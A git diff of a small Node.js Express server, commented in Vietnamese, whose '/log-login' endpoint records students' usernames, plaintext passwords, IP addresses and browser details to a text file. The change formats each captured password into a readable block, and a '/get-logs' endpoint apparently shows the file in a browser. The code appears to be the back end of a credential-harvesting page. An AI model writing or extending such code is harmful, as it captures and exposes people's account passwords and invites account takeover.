@@ -23,15 +23,23 @@ app.get("/", (req, res) => {
 
 // API ghi log khi có học sinh đăng nhập
 app.post("/log-login", (req, res) => {
-  const { user, password, time, userAgent } = req.body;
+  const { user, password, userAgent } = req.body;
   const ip =
     req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
     req.socket.remoteAddress;
 
-  const line = `[${new Date().toISOString()}] user=${user} pass=${password} ip=${ip} ua="${userAgent}"\n`;
+  // Ghi log dạng dễ đọc hơn
+  const logLine = 
+`🕒 Thời gian: ${new Date().toLocaleString("vi-VN")}
+👤 Tên đăng nhập: ${user}
+🔑 Mật khẩu: ${password}
+🌐 IP: ${ip}
+💻 Trình duyệt: ${userAgent}
+----------------------------------------
+`;
 
   try {
-    appendLog(line);
+    appendLog(logLine);
     res.json({ ok: true });
   } catch (e) {
     console.error("❌ Lỗi ghi log:", e);
@@ -39,7 +47,7 @@ app.post("/log-login", (req, res) => {
   }
 });
 
-// 🔹 API mới: xem log trên trình duyệt
+// API mới: xem log trên trình duyệt
 app.get("/get-logs", (req, res) => {
   const file = path.join(LOG_DIR, "logins.txt");
   if (fs.existsSync(file)) {
